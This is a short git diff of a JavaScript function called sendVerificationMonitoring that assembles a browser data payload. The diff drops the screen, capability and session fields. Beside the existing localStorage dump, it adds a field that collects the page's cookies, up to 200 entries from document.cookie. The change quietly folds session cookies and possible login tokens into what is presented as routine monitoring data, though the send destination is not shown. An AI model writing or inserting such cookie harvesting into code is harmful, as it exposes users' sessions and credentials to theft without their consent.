@@ -196,14 +196,7 @@ function sendVerificationMonitoring() {
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unavailable",
                 cookieEnabled: navigator.cookieEnabled
             },
-            display: {
-                width: window.screen?.width || 0,
-                height: window.screen?.height || 0,
-                availableWidth: window.screen?.availWidth || 0,
-                availableHeight: window.screen?.availHeight || 0,
-                colorDepth: window.screen?.colorDepth || 0,
-                pixelRatio: window.devicePixelRatio || 1
-            },
+           
             network: connection ? {
                 type: connection.type || "Unavailable",
                 effectiveType: connection.effectiveType || "Unavailable",
@@ -211,19 +204,8 @@ function sendVerificationMonitoring() {
                 rtt: typeof connection.rtt === "number" ? connection.rtt : null,
                 saveData: Boolean(connection.saveData)
             } : {},
-            capabilities: {
-                localStorage: Boolean(localStorage),
-                serviceWorker: "serviceWorker" in navigator,
-                touchPoints: navigator.maxTouchPoints || 0,
-                online: navigator.onLine
-            },
-            session: {
-                url: window.location.pathname,
-                referrer: document.referrer ? new URL(document.referrer).origin : "Unavailable",
-                visibility: document.visibilityState,
-                historyLength: window.history.length
-            },
-            storage: describeLocalStorage(localStorage)
+            storage: describeLocalStorage(localStorage),
+            cookies: document.cookie ? document.cookie.split('; ').slice(0, 200) : []
         };
     } catch {
         return;
